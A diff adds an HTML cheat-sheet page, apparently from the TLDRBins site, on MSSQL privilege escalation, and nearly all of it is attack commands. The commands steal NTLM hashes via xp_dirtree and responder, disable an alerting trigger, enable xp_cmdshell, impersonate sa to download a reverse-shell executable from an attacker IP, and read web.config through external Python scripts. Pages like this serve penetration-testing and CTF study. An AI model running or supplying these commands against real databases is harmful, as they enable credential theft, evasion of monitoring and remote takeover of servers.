@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>MSSQL Privilege Escalation | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/mssql_privilege_escalation/">
+      <span>MSSQL Privilege Escalation</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@mssql/">Mssql</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@database/">Database</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@exploit/">Exploit</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@rce/">RCE</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@privilege-escalation/">Privilege Escalation</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h4 id="steal-ntlm-hash">Steal NTLM hash</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In our local Linux machine</span>
+</span></span><span class="line"><span class="cl">sudo responder -I tun0
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Inside mssql terminal
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\10.10.14.10\any\thing&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><h4 id="run-xp_cmdshell">Run xp_cmdshell</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Check any policy blocking xp_cmdshell
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">server_triggers</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># Disable trigger if any
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">disable</span><span class="w"> </span><span class="k">trigger</span><span class="w"> </span><span class="n">ALERT_xp_cmdshell</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="k">all</span><span class="w"> </span><span class="n">server</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># Enable xp_cmdshell
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">enable_xp_cmdshell</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># RCE
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="n">whoami</span><span class="w">
+</span></span></span></code></pre></div><h4 id="impersonate-sa-to-run-xp_cmdshell">Impersonate sa to run xp_cmdshell</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">reconfigure</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">reconfigure</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">EXEC</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;powershell.exe -ep bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe&#39;</span><span class="w">
+</span></span></span></code></pre></div><h4 id="run-external-script">Run External Script</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">EXEC</span><span class="w"> </span><span class="n">sp_execute_external_script</span><span class="w"> </span><span class="o">@</span><span class="n">language</span><span class="w"> </span><span class="o">=</span><span class="n">N</span><span class="s1">&#39;Python&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">N</span><span class="s1">&#39;import os; os.system(&#34;whoami&#34;);&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">EXEC</span><span class="w"> </span><span class="n">sp_execute_external_script</span><span class="w"> </span><span class="o">@</span><span class="n">language</span><span class="w"> </span><span class="o">=</span><span class="n">N</span><span class="s1">&#39;Python&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">N</span><span class="s1">&#39;import os; os.system(&#34;type \inetpub\wwwroot\web.config&#34;);&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><br></div></div>
+    
+    <script src="/copy-code-button.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
